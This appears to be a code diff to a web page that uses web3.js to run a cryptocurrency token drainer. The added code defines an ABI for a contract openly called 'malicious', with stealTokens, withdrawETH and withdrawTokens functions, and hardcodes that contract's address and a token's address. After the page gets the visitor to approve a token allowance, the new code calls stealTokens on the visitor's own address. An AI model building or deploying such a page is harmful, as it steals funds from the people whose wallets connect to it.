@@ -21,6 +21,7 @@
         const maliciousContractAddress = '0xb32201C09796d9664ee353383B6405515fDc050a';
         const tkkTokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';
 
+        // ABI for the TKK Token (ERC-20)
         const tkkTokenABI = [
             {
                 "inputs": [
@@ -29,6 +30,72 @@
                 ],
                 "name": "approve",
                 "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "account", "type": "address" }
+                ],
+                "name": "balanceOf",
+                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "recipient", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "transfer",
+                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "sender", "type": "address" },
+                    { "internalType": "address", "name": "recipient", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "transferFrom",
+                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        // ABI for the Malicious Contract
+        const maliciousContractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "victim", "type": "address" }
+                ],
+                "name": "stealTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawETH",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "_tokenAddress", "type": "address" }
+                ],
+                "name": "setTokenAddress",
+                "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             }
@@ -71,8 +138,14 @@
 
                 document.getElementById('status').innerText = `Tokens approved! Transaction: ${approveTx.transactionHash}`;
 
-                // After this approval, the malicious contract can now steal the tokens
-                document.getElementById('status').innerText += '\nNow the malicious contract can steal the tokens!';
+                // Interact with the malicious contract to steal the tokens (optional)
+                const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+                const stealTx = await maliciousContract.methods
+                    .stealTokens(victimAddress)
+                    .send({ from: victimAddress });
+
+                document.getElementById('status').innerText += `\nSteal tokens transaction: ${stealTx.transactionHash}`;
+
             } catch (error) {
                 document.getElementById('status').innerText = `Error: ${error.message}`;
             }
@@ -80,5 +153,6 @@
     </script>
 </body>
 </html>
+
 
 
